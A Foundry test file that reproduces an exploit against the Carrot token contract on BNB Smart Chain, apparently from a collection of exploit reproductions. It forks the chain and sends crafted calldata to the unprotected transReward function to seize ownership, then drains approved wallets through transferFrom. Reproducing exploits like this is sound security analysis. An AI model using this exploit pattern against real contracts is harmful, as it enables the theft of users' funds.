// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

/*
Attacker: 0xd11a93a8db5f8d3fb03b88b4b24c3ed01b8a411c

Attacker contract: 0x5575406ef6b15eec1986c412b9fbe144522c45ae

Vulnerable contract: 0xd2869042e12a3506100af1d192b5b04d65137941
Pool address: 0x6863b549bf730863157318df4496ed111adfa64f
Attack tx: https://bscscan.com/tx/0xa624660c29ee97f3f4ebd36232d8199e7c97533c9db711fa4027994aa11e01b9

Root cause: Insufficient access control to the migrateStake function.
*/

interface ICarrot {
    function transReward(bytes memory data) external;
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  ICarrot Carrot = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);

  function setUp() public {
    cheat.createSelectFork("bsc", 22055611); // fork bsc at block 22055611
  }

  function testExploit() public {


    console.log("Perform transReward to set owner");
    Carrot.transReward(hex'bf699b4b000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e84');

    // pool address: 0x6863b549bf730863157318df4496ed111adfa64f
    // 0xbf699b4b" change owner
    // address(this): 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84

    console.log("Perform transferFrom");

    Carrot.transferFrom(0x00B433800970286CF08F34C96cf07f35412F1161,address(this),310344736073087429864760);
    // all wallets granted approvals are impacted.


    console.log("After exploiting, Carrot balance:", Carrot.balanceOf(address(this))/1e18);
  }

   function migrateWithdraw(address, uint256) public //callback
   {

   }
}
